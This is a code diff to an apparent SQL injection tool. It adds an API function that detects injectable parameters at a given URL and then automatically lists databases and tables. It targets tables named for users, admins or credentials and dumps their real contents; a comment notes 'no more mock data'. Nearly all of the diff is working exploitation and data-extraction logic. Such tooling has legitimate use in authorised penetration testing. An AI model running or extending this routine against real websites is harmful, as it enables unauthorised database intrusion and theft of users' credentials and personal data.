@@ -192,5 +192,83 @@ def test_sqli(**kwargs):
             json.dump(results, f, indent=2)
         click.echo(f"\n[+] Detailed report saved to: {_colored(output_file, B_GREEN)}")
 
+def test_sqli_api(url):
+    """
+    API Wrapper for Automated SQLi Penetration & Data Extraction.
+    """
+    engine = GoEngine()
+    if not engine.available or not engine.ensure_compiled():
+        return {"error": "SQLi Engine (Go) not available"}
+    
+    try:
+        # Phase 1: Vulnerability Assessment
+        results = engine.run(url=url, method='GET', timeout=10)
+        
+        formatted = []
+        explorer = {"databases": [], "tables": {}, "sample_data": []}
+        vuln_found = False
+        
+        for r in results:
+            if r.get('parameter') != "enumeration":
+                vuln_found = True
+                formatted.append({
+                    "param": r.get('parameter', 'N/A'),
+                    "type": r.get('type', 'N/A'),
+                    "payload": r.get('payload', 'N/A'),
+                    "dbms": r.get('dbms', 'Unknown'),
+                    "severity": "HIGH" if r.get('type') != 'Boolean-based' else "MEDIUM"
+                })
+
+        # Phase 2: Automated Exfiltration (If Vuln Found)
+        if vuln_found:
+            # 1. List Databases
+            db_res = engine.run(url=url, list_dbs=True, timeout=15)
+            for d in db_res:
+                if d.get('type') == 'list-dbs':
+                    explorer["databases"] = [item.strip() for item in d.get('payload', '').split(',') if item.strip()]
+            
+            # 2. Heuristic Table Discovery
+            if explorer["databases"]:
+                target_db = explorer["databases"][0]
+                table_res = engine.run(url=url, list_tables=True, database=target_db, timeout=15)
+                tables = []
+                for t in table_res:
+                    if t.get('type') == 'list-tables':
+                        tables = [item.strip() for item in t.get('payload', '').split(',') if item.strip()]
+                        explorer["tables"][target_db] = tables
+
+                # 3. Target Promise Table (users, admins, etc.)
+                promising_table = None
+                for t_name in tables:
+                    if any(x in t_name.lower() for x in ['user', 'admin', 'account', 'member', 'staff', 'credential']):
+                        promising_table = t_name
+                        break
+                
+                # If no promising table, just take the first one
+                if not promising_table and tables:
+                    promising_table = tables[0]
+
+                # 4. Real Data Dump (No more mock data)
+                if promising_table:
+                    dump_res = engine.run(url=url, dump_table=promising_table, database=target_db, timeout=20)
+                    for dr in dump_res:
+                        if dr.get('type') == 'dump-table':
+                            # Parse CSV/JSON response from engine into objects
+                            raw_data = dr.get('payload', '')
+                            try:
+                                # Assuming engine returns JSON string for dump
+                                explorer["sample_data"] = json.loads(raw_data)
+                            except:
+                                # Fallback if it's a simple list/csv
+                                explorer["sample_data"] = [{"raw_dump": raw_data}]
+
+        return {
+            "findings": formatted,
+            "explorer": explorer,
+            "vuln": vuln_found
+        }
+    except Exception as e:
+        return {"error": str(e)}
+
 if __name__ == "__main__":
     sqli_cli()
